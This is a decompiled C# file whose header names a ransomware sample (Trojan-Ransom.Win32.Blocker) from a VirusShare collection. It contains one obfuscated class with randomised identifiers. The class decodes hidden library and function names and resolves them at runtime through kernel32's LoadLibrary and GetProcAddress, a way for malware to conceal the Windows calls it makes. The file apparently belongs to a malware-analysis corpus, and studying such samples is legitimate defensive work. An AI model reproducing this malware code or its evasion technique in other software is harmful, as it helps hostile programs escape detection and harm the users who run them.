// Decompiled with JetBrains decompiler
// Type: GMTXgkoxMKfPPprguAuZBnWkDLqvmFFkZNsttlj.LFsbHAWQYegumkICuthagKgCTIYwhJGcvCWMMT
// Assembly: DRAT, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: 598F8269-5A45-45F8-8445-F33B178B2B1B
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00010-msil\Trojan-Ransom.Win32.Blocker.ijhl-4052c51fa971089998d252af8a00e6ab263cfd020ae698d30b34275299ba2636.exe

using Microsoft.Win32.SafeHandles;
using System;
using System.Runtime.ConstrainedExecution;
using System.Runtime.InteropServices;
using System.Security.Permissions;

namespace GMTXgkoxMKfPPprguAuZBnWkDLqvmFFkZNsttlj
{
  public abstract class LFsbHAWQYegumkICuthagKgCTIYwhJGcvCWMMT
  {
    public Delegate uCHkOiOwxIqsRApAvvavaZIRYVOSQFmdVkaNdjU(
      string icrSHQupRidoJtbNBXqFxXYePVBukOulbxxwk,
      string WhXOHLETveRkVkULpLENAkPvFAjnNKudYGBJdj,
      Type KXuYVavoHRNFmpXnkSaGHXMDiimMMjLgGtsl)
    {
      string MpSIHcWACIjBOPmDaGiLolimjZTDfxovkjVYFw = wqLGGWZMfRGmOLpGBtLnopaCfEWfPPkJHhZ.IcNbGlYsHAulrpCjvQKoWbCYVdMJLMlrdwqle(icrSHQupRidoJtbNBXqFxXYePVBukOulbxxwk);
      string toDgaALwUUaenHaOWHbUdGTQDPmMdpLtcGkS = wqLGGWZMfRGmOLpGBtLnopaCfEWfPPkJHhZ.IcNbGlYsHAulrpCjvQKoWbCYVdMJLMlrdwqle(WhXOHLETveRkVkULpLENAkPvFAjnNKudYGBJdj);
      LFsbHAWQYegumkICuthagKgCTIYwhJGcvCWMMT.SafeLibraryHandle FImYbxeCQBlKSuRcZPkVlaIMuTdGfCeVFeRu = LFsbHAWQYegumkICuthagKgCTIYwhJGcvCWMMT.Methods.LoadLibrary(MpSIHcWACIjBOPmDaGiLolimjZTDfxovkjVYFw);
      Delegate @delegate = (Delegate) null;
      if (!FImYbxeCQBlKSuRcZPkVlaIMuTdGfCeVFeRu.IsInvalid && !FImYbxeCQBlKSuRcZPkVlaIMuTdGfCeVFeRu.IsClosed)
      {
        @delegate = Marshal.GetDelegateForFunctionPointer(LFsbHAWQYegumkICuthagKgCTIYwhJGcvCWMMT.Methods.GetProcAddress(FImYbxeCQBlKSuRcZPkVlaIMuTdGfCeVFeRu, toDgaALwUUaenHaOWHbUdGTQDPmMdpLtcGkS), KXuYVavoHRNFmpXnkSaGHXMDiimMMjLgGtsl);
        FImYbxeCQBlKSuRcZPkVlaIMuTdGfCeVFeRu.Close();
      }
      return @delegate;
    }

    public sealed class Methods
    {
      private const string KERNEL32 = "kernel32";

      [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
      [DllImport("kernel32", SetLastError = true)]
      [return: MarshalAs(UnmanagedType.Bool)]
      public static extern bool FreeLibrary(IntPtr FImYbxeCQBlKSuRcZPkVlaIMuTdGfCeVFeRu);

      [DllImport("kernel32")]
      public static extern IntPtr GetProcAddress(
        LFsbHAWQYegumkICuthagKgCTIYwhJGcvCWMMT.SafeLibraryHandle FImYbxeCQBlKSuRcZPkVlaIMuTdGfCeVFeRu,
        string toDgaALwUUaenHaOWHbUdGTQDPmMdpLtcGkS);

      [DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
      public static extern LFsbHAWQYegumkICuthagKgCTIYwhJGcvCWMMT.SafeLibraryHandle LoadLibrary(
        string MpSIHcWACIjBOPmDaGiLolimjZTDfxovkjVYFw);
    }

    [SecurityPermission(SecurityAction.LinkDemand, UnmanagedCode = true)]
    public sealed class SafeLibraryHandle : SafeHandleZeroOrMinusOneIsInvalid
    {
      private SafeLibraryHandle()
        : base(true)
      {
      }

      protected override bool ReleaseHandle() => LFsbHAWQYegumkICuthagKgCTIYwhJGcvCWMMT.Methods.FreeLibrary(this.handle);
    }
  }
}
